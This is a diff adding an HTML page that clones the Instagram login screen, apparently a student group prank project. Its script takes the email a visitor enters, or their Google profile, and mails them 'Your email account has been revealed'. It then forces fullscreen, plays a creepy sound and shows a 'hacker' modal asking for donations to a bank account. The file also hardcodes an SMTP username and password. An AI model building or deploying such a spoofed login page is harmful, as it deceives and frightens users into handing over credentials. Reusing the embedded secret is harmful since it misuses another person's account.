@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="google-signin-client_id" content="303523771509-ooe441vle0jttivjba1e7ges89uuuieb.apps.googleusercontent.com">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+
+  <link rel="stylesheet" href="./styles/style.css">
+  
+  <link rel="stylesheet" href="./styles/reset.css">
+  <link rel="stylesheet" href="./styles/stylefeed.css">
+  <script src="https://apis.google.com/js/platform.js" async defer></script>
+  <style>
+    /* Popup container - can be anything you want */
+    .popup {
+      position: relative;
+      cursor: pointer;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    
+    /* The actual popup */
+    .popup .popuptext {
+      visibility: hidden;
+      width: 250px;
+      background-color: #555;
+      color: #fff;
+      text-align: center;
+      border-radius: 6px;
+      padding: 13px 6px;
+      position: absolute;
+      z-index: 1;
+      bottom: 125%;
+      left: 50%;
+      margin-left: -80px;
+    }
+    
+    /* Popup arrow */
+    .popup .popuptext::after {
+      content: "";
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      margin-left: -5px;
+      border-width: 5px;
+      border-style: solid;
+      border-color: #555 transparent transparent transparent;
+    }
+    
+    /* Toggle this class - hide and show the popup */
+    .popup .show {
+      visibility: visible;
+      -webkit-animation: fadeIn 1s;
+      animation: fadeIn 1s;
+    }
+    
+    /* Add animation (fade in the popup) */
+    @-webkit-keyframes fadeIn {
+      from {opacity: 0;} 
+      to {opacity: 1;}
+    }
+    
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity:1 ;}
+    }
+    .modal {
+      display: none; /* Hidden by default */
+      position: fixed; /* Stay in place */
+      z-index: 1; /* Sit on top */
+      padding-top: 100px; /* Location of the box */
+      left: 0;
+      top: 0;
+      width: 100%; /* Full width */
+      height: 100%; /* Full height */
+      overflow: auto; /* Enable scroll if needed */
+      background-color: rgb(0,0,0); /* Fallback color */
+      background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+    }
+
+    /* Modal Content */
+    .modal-content {
+      background-color: #fefefe;
+      margin: auto;
+      padding: 20px;
+      border: 1px solid #888;
+      width: 80%;
+    }
+
+    /* The Close Button */
+    .close {
+      color: #aaaaaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+    }
+
+    .close:hover,
+    .close:focus {
+      color: #000;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    </style>
+</head>
+
+<body>
+  <div id="content-container">
+
+    <!--Phone's pictures section-->
+    <section class="phones">
+      <img src="./assets/phones.png" alt="pictures on phone" class="phone-image">
+      <div class="display-phone">
+        <img class="picture" src="./assets/photo-1.png" alt="#">
+        <img class="picture" src="./assets/photo-2.png" alt="#">
+        <img class="picture" src="./assets/photo-3.png" alt="#">
+        <img class="picture" src="./assets/photo-4.png" alt="#">
+        <img class="picture" src="./assets/photo-5.png" alt="#">
+      </div>
+    </section>
+
+    <!--User's log in section-->
+    <section class="user">
+
+      <div class="login-container">
+
+        <!--Instagram Logo-->
+        <div class="instagram-logo-box">
+          <img class="instagram-logo" src="./assets/instagram-logo.png">
+        </div>
+
+        <!--Form Login-->
+        <form id="login-post" method="POST">
+          <div class="inputs-container">
+            <input id="email" type="email" name="username" placeholder="Email">
+          </div>
+          <div class="inputs-container">
+            <input id="password" type="password" name="password" placeholder="Password">
+          </div>
+          <a class="login-button" style="cursor: pointer;" onclick="login()">
+            Log In
+          </a>
+
+          <div class="or-container">
+            <div class="line"></div>
+            <div class="or">OR</div>
+            <div class="line"></div>
+          </div>
+
+          <!--Facebook login-->
+          <div class="facebook-container">
+            <!-- <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
+                src="./assets/facebook-logo.png">
+              Log in with google  
+            </a> -->
+            
+        <button >
+          <div class="g-signin2" data-onsuccess="onSignIn">
+          </div>
+        </button>
+          </div>
+        </form>
+        
+
+        <!--Password recovery-->
+        <a class="password-forgot popup" onclick="openPopup(3000, 'forgot-password')">
+          <span class="popuptext" id="forgot-password">
+            Sorry for the inconvenience.<br>
+            you can't use this function.<br>
+          </span>
+          Forgot password?
+        </a>
+      </div>
+
+      <!--Sign up-->
+      <div class="signup-container popup" onclick="openPopup(3000, 'register')">
+        <span class="popuptext" id="register">
+          Sorry for the inconvenience.<br>
+          The system is having problems, you can't register now.<br>
+        </span>
+        <p>Don't have an account? <a class="signup">Sign up</a></p>
+      </div>
+
+      <!--App's download-->
+      <div class="get-container">
+        <p>Get the app.</p>
+        <div class="download-container">
+          <a class="download-appstore" href="#" target="_blank"><img class="appstore"
+              src="./assets/applestore-logo.png"></a>
+          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay"
+              src="./assets/googleplay-logo.png"></a>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <footer id="footer1" class="page-footer">
+
+    <div class="links-container">
+      <ul class="links-list">
+        <li>
+          <a class="link" href="#" target="_blank">ABOUT</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">PRESS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">API</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">JOBS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">PRIVACY</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">TERMS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">LOCATIONS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">TOP ACCOUNTS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">HASHTAGS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">LANGUAGE</a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="footer-span-container">
+      <span class="footer-span">
+        © 2020 INSTAGRAM FROM FACEBOOK
+      </span>
+    </div>
+    <!-- <button id="btn_fullscreen" onclick="fullscreen()">a</button> -->
+  </footer>
+
+  <div id="fullscreened" style="display: none;">
+    <header onclick="fullscreen()">
+      <div class="container">
+          <div class="logo">
+              <ion-icon name="logo-instagram" class="insta"></ion-icon>
+              <img src="./assets/logo.png" alt="">
+              <ion-icon name="paper-plane-outline" class="icons mobile"></ion-icon>
+          </div>
+
+          <div class="search">
+              <p>Pesquisar</p>
+          </div>
+
+          <nav>
+              <ion-icon name="paper-plane-outline" class="icons"></ion-icon>
+              <ion-icon name="compass-outline" class="icons"></ion-icon>
+              <ion-icon name="heart-outline" class="icons"></ion-icon>
+              <ion-icon name="person-outline" class="icons"></ion-icon>
+          </nav>
+      </div>
+  </header>
+
+  <main onclick="fullscreen()">
+      <div class="main__container">
+          <div class="side-bar">
+              <div class="top">
+                  <img src="./assets/catanacomics 1.png" alt="">
+                  <div class="info">
+                      <h1>catanacomics</h1>
+                      <p>Catana</p>
+                  </div>
+
+              </div>
+
+              <h2>Sugestões para você <span>ver tudo</span></h2>
+
+              <div class="item">
+                  <div class="info">
+                      <img src="./assets/badvibesmemes 1.png" alt="">
+                      <h2> bad.vibes.memes <span>Segue você</span></h2>
+                  </div>
+
+                  <p>seguir</p>
+              </div>
+
+              <div class="item">
+                  <div class="info">
+                      <img src="./assets/meowed 2.png" alt="">
+                      <h2> meowed <span>Segue você</span></h2>
+                  </div>
+
+                  <p>seguir</p>
+              </div>
+
+              <div class="item">
+                  <div class="info">
+                      <img src="./assets/chibirdart 1.png" alt="">
+                      <h2> chibirdart <span>Segue você</span></h2>
+                  </div>
+
+                  <p>seguir</p>
+              </div>
+
+              <p class="footer">
+                  Sobre • Ajuda • Imprensa • API • Carreiras • Privacidade • Termos • Localizações • Contas mais
+                  relevantes • Hashtags • Idioma
+              </p>
+
+              <p class="footer">
+                  © 2021 INSTAGRAM DO FACEBOOK
+              </p>
+          </div>
+
+          <div class="stories">
+              <div class="arrow">
+                  <ion-icon name="chevron-forward-outline"></ion-icon>
+              </div>
+              <div class="row">
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/9gag.png" alt="">
+                      </div>
+                      <p>9gag</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/meowed 1.png" alt="">
+                      </div>
+                      <p>meowed</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/barked 1.png" alt="">
+                      </div>
+                      <p>Barked</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/pedro.jpeg" alt="">
+                      </div>
+                      <p>Pedro</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/vanin.jpeg" alt="">
+                      </div>
+                      <p>vanin</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/bia_maravilhosa.jpeg" alt="">
+                      </div>
+                      <p>bia</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/9gag.png" alt="">
+                      </div>
+                      <p>9gag</p>
+                  </div>
+
+                  <div class="item">
+                      <div class="img">
+                          <img src="./assets/9gag.png" alt="">
+                      </div>
+                      <p>9gag</p>
+                  </div>
+
+              </div>
+
+          </div>
+
+          <div class="posts">
+
+              <div class="item">
+                  <div class="top">
+                      <div class="box">
+                          <img src="./assets/Duc.jpg" alt="">
+                          <h1>Nguyễn Minh Đức 19110351</h1>
+                      </div>
+
+
+                      <ion-icon name="ellipsis-horizontal-outline"></ion-icon>
+                  </div>
+
+                  <img class="feed" src="./assets/Duc.jpg" alt="">
+
+                  <div class="bot">
+                      <div class="interact">
+                          <div class="left">
+                              <ion-icon class="icons" name="heart" style="color: rgb(219, 62, 101)"></ion-icon>
+                              <ion-icon class="icons" name="chatbubble-outline"></ion-icon>
+                              <ion-icon class="icons" name="paper-plane-outline"></ion-icon>
+                          </div>
+
+                          <ion-icon class="icons" name="bookmark-outline"></ion-icon>
+                      </div>
+
+                      <div class="desc">
+                          <img src="./assets/vanin.jpeg" alt="">
+                          <h2>Curtido por <strong>Vanin</strong> e <strong>outras 1.101.523.900 pessoas</strong></h2>
+                      </div>
+
+                      <div class="input">
+                          <h2> <strong>Vanin</strong> Meu deus! essa a é a mulher mais linda que eu já vi 🥰😍</h2>
+                          <ion-icon name="heart-outline"></ion-icon>
+                      </div>
+
+                      <div class="comment">
+                          <div class="box">
+                              <p class="placeholer">
+                                  <img src="./assets/vanin.jpeg" alt=""> Adicione um comentário...
+                              </p>
+                              <ion-icon name="add-circle-outline"></ion-icon>
+                          </div>
+                          <div class="info">
+                              <p>Há 1 horas atrás • <span> ver tradução </span></p>
+                          </div>
+                      </div>
+
+                  </div>
+
+              </div>
+
+              <div class="item">
+                <div class="top">
+                    <div class="box">
+                        <img src="./assets/Tinh.png" alt="">
+                        <h1>Bùi Văn Tính Mer 19110478</h1>
+                    </div>
+
+
+                    <ion-icon name="ellipsis-horizontal-outline"></ion-icon>
+                </div>
+
+                <img class="feed" src="./assets/Tinh.png" alt="">
+
+                <div class="bot">
+                    <div class="interact">
+                        <div class="left">
+                            <ion-icon class="icons" name="heart" style="color: rgb(219, 62, 101)"></ion-icon>
+                            <ion-icon class="icons" name="chatbubble-outline"></ion-icon>
+                            <ion-icon class="icons" name="paper-plane-outline"></ion-icon>
+                        </div>
+
+                        <ion-icon class="icons" name="bookmark-outline"></ion-icon>
+                    </div>
+
+                    <div class="desc">
+                        <img src="./assets/vanin.jpeg" alt="">
+                        <h2>Curtido por <strong>Vanin</strong> e <strong>outras 1.101.523.900 pessoas</strong></h2>
+                    </div>
+
+                    <div class="input">
+                        <h2> <strong>Vanin</strong> Meu deus! essa a é a mulher mais linda que eu já vi 🥰😍</h2>
+                        <ion-icon name="heart-outline"></ion-icon>
+                    </div>
+
+                    <div class="comment">
+                        <div class="box">
+                            <p class="placeholer">
+                                <img src="./assets/vanin.jpeg" alt=""> Adicione um comentário...
+                            </p>
+                            <ion-icon name="add-circle-outline"></ion-icon>
+                        </div>
+                        <div class="info">
+                            <p>Há 1 horas atrás • <span> ver tradução </span></p>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+            <div class="item">
+              <div class="top">
+                  <div class="box">
+                      <img src="./assets/Mthang.jpg" alt="">
+                      <h1>Nguyễn Minh Thắng 19110462</h1>
+                  </div>
+
+
+                  <ion-icon name="ellipsis-horizontal-outline"></ion-icon>
+              </div>
+
+              <img class="feed" src="./assets/Mthang.jpg" alt="">
+
+              <div class="bot">
+                  <div class="interact">
+                      <div class="left">
+                          <ion-icon class="icons" name="heart" style="color: rgb(219, 62, 101)"></ion-icon>
+                          <ion-icon class="icons" name="chatbubble-outline"></ion-icon>
+                          <ion-icon class="icons" name="paper-plane-outline"></ion-icon>
+                      </div>
+
+                      <ion-icon class="icons" name="bookmark-outline"></ion-icon>
+                  </div>
+
+                  <div class="desc">
+                      <img src="./assets/vanin.jpeg" alt="">
+                      <h2>Curtido por <strong>Vanin</strong> e <strong>outras 1.101.523.900 pessoas</strong></h2>
+                  </div>
+
+                  <div class="input">
+                      <h2> <strong>Vanin</strong> Meu deus! essa a é a mulher mais linda que eu já vi 🥰😍</h2>
+                      <ion-icon name="heart-outline"></ion-icon>
+                  </div>
+
+                  <div class="comment">
+                      <div class="box">
+                          <p class="placeholer">
+                              <img src="./assets/vanin.jpeg" alt=""> Adicione um comentário...
+                          </p>
+                          <ion-icon name="add-circle-outline"></ion-icon>
+                      </div>
+                      <div class="info">
+                          <p>Há 1 horas atrás • <span> ver tradução </span></p>
+                      </div>
+                  </div>
+
+              </div>
+
+          </div>
+
+              <div class="item">
+                  <div class="top">
+                      <div class="box">
+                          <img src="./assets/pedro.jpeg" alt="">
+                          <h1>Pedro</h1>
+                      </div>
+
+
+                      <ion-icon name="ellipsis-horizontal-outline"></ion-icon>
+                  </div>
+
+                  <video src="./assets/video.mp4" class="feed" controls></video>
+
+                  <div class="bot">
+                      <div class="interact">
+                          <div class="left">
+                              <ion-icon class="icons" name="heart-outline"></ion-icon>
+                              <ion-icon class="icons" name="chatbubble-outline"></ion-icon>
+                              <ion-icon class="icons" name="paper-plane-outline"></ion-icon>
+                          </div>
+
+                          <ion-icon class="icons" name="bookmark-outline"></ion-icon>
+                      </div>
+
+                      <div class="desc">
+                          <img src="./assets/vanin.jpeg" alt="">
+                          <h2>Curtido por <strong>Vanin</strong> e <strong>outras 2 pessoas</strong></h2>
+                      </div>
+
+                      <div class="input">
+                          <h2> <strong>Vanin</strong> Ursinho burrinho</h2>
+                          <ion-icon name="heart-outline"></ion-icon>
+                      </div>
+                      <div class="comment">
+                          <div class="box">
+                              <p class="placeholer">
+                                  <img src="./assets/vanin.jpeg" alt=""> Adicione um comentário...
+                              </p>
+                              <ion-icon name="add-circle-outline"></ion-icon>
+                          </div>
+                          <div class="info">
+                              <p>Há 1 horas atrás • <span> ver tradução </span></p>
+                          </div>
+                      </div>
+
+                  </div>
+
+              </div>
+
+              <div class="item">
+                  <div class="top">
+                      <div class="box">
+                          <img src="./assets/meowed 2.png" alt="">
+                          <h1>meowed</h1>
+                      </div>
+
+
+                      <ion-icon name="ellipsis-horizontal-outline"></ion-icon>
+                  </div>
+
+                  <img class="feed" src="./assets/gato-telefone 1.png" alt="">
+
+                  <div class="bot">
+                      <div class="interact">
+                          <div class="left">
+                              <ion-icon class="icons" name="heart-outline"></ion-icon>
+                              <ion-icon class="icons" name="chatbubble-outline"></ion-icon>
+                              <ion-icon class="icons" name="paper-plane-outline"></ion-icon>
+                          </div>
+
+                          <ion-icon class="icons" name="bookmark-outline"></ion-icon>
+                      </div>
+
+                      <div class="desc">
+                          <img src="./assets/respondeai 2.png" alt="">
+                          <h2>Curtido por <strong>respondeai</strong> e <strong>outras 101.523 pessoas</strong></h2>
+                      </div>
+                      <div class="input">
+                          <h2> <strong>Bia Linda Maravilhosa</strong> Que gatinho mais fofo meu deus 🥺🥺</h2>
+                          <ion-icon class="icons" name="heart" style="color:  rgb(219, 62, 101)"></ion-icon>
+                      </div>
+                      <div class="comment">
+                          <div class="box">
+                              <p class="placeholer">
+                                  <img src="./assets/vanin.jpeg" alt=""> Adicione um comentário...
+                              </p>
+                              <ion-icon name="add-circle-outline"></ion-icon>
+                          </div>
+                          <div class="info">
+                              <p>Há 1 horas atrás • <span> ver tradução </span></p>
+                          </div>
+                      </div>
+
+                  </div>
+
+              </div>
+
+
+          </div>
+
+      </div>
+
+      <div class="menu">
+          <ion-icon name="home"></ion-icon>
+          <ion-icon name="search-outline"></ion-icon>
+          <ion-icon name="add-circle-outline"></ion-icon>
+          <ion-icon name="heart-outline"></ion-icon>
+          <ion-icon name="person-outline"></ion-icon>
+      </div>
+
+  </main>
+  </div>
+  <div id="myModal" class="modal" style="z-index: 999; text-align: center;">
+    <!-- Modal content -->
+    <div class="modal-content" onclick="fullscreen()"
+      style="margin: auto; display: block; margin-bottom: 15px;"
+    >
+      <img src="./assets/hacker.jpg" alt="GROUP06">
+      <br>
+      <em>Donate me at 18810000200xxx. Contact me to know xxx. Ngân hàng Đầu Tư và Phát Triển Việt Nam Quận Gò Vấp.
+      </em>
+      <br>
+      <strong>Nguyễn Minh Thắng - 19110462</strong><br><br>
+      <strong>Nguyễn Minh Đức - 19110351</strong><br><br>
+      <strong>Bùi Văn Tính - 19110478</strong><br><br>
+      <strong>Dương Đức Thắng - 19110461</strong><br><br>
+    </div>
+  
+  </div>
+  <script>
+    var elem = document.documentElement;
+    function ValidateEmail(mail) 
+    {
+      var mailformat = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
+
+      if(mail.match(mailformat))
+      {
+        return (true)
+      }
+        alert("You have entered an invalid email address!")
+        return (false)
+    }
+    /* View in fullscreen */
+    function fullscreen() {
+      if ((document.fullScreenElement && document.fullScreenElement !== null) ||
+          (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+          if (document.documentElement.requestFullScreen) {
+              document.documentElement.requestFullScreen();
+          } else if (document.documentElement.mozRequestFullScreen) {
+              document.documentElement.mozRequestFullScreen();
+          } else if (document.documentElement.webkitRequestFullScreen) {
+              document.documentElement.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+          }
+      }
+    }
+
+    // window.onload = () => {
+    //   if (window.location.href.toString() !== "http://localhost:5500/") {
+    //     window.location.replace("http://localhost:5500");
+    //   }
+    // }
+    // When the user clicks on div, open the popup
+    function openPopup(milisecond, idElement) {
+      var popup = document.getElementById(idElement);
+      popup.classList.toggle("show");
+      setTimeout(() => {
+        popup.classList.remove("show");
+      }, milisecond);
+    }
+    function login() {
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+      if (email && password) {
+        if (ValidateEmail(email)) {
+          sendEmail(email);
+          document.getElementById("content-container").style.display = "none";
+          document.getElementById("footer1").style.display = "none";
+          document.getElementById("fullscreened").style.display = "block";
+          fullscreen();
+        }
+        return;
+      }
+      else {
+        alert("email or password invalid")
+      }
+    }
+    function onSignIn(googleUser) {
+      var profile = googleUser.getBasicProfile();
+      console.log('ID: ' + profile.getId()); // Do not send to your backend! Use an ID token instead.
+      console.log('Name: ' + profile.getName());
+      console.log('Image URL: ' + profile.getImageUrl());
+      console.log('Email: ' + profile.getEmail()); // This is null if the 'email' scope is not present.
+      //
+      sendEmail(profile.getEmail());
+      document.getElementById("content-container").style.display = "none";
+      document.getElementById("footer1").style.display = "none";
+      document.getElementById("fullscreened").style.display = "block";
+    }
+    function sendEmail(email, password) {
+      Email.send({
+          Host : "smtp.elasticemail.com ",
+          Username : "thangduc.duong14@gmail.com",
+          Password : "50FEB07A137156323F4701CB2F22CA017678",
+          Port : 2525,
+          To : email,
+          From : "aslanteam.noreply@gmail.com",
+          Subject : "Test email",
+          Body : "<html><h2>Your email account has been revealed</h2><br><em>Nguyễn Minh Đức 19110351</em><br><em>Nguyễn Minh Thắng 19110462</em><br><em>Bùi Văn Tính 19110478</em><br><em>Dương Đức Thắng 19110461</em></html>"
+      }).then(
+        message => console.log(message)
+      );
+    }
+    // Get the modal
+    var modal = document.getElementById("myModal");
+
+    // Get the button that opens the modal
+    var btn = document.getElementById("fullscreened");
+
+    btn.onclick = function() {
+      var audio = new Audio("./sound/creepy.mp3");
+      audio.play();
+      modal.style.display = "block";
+    }
+    </script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
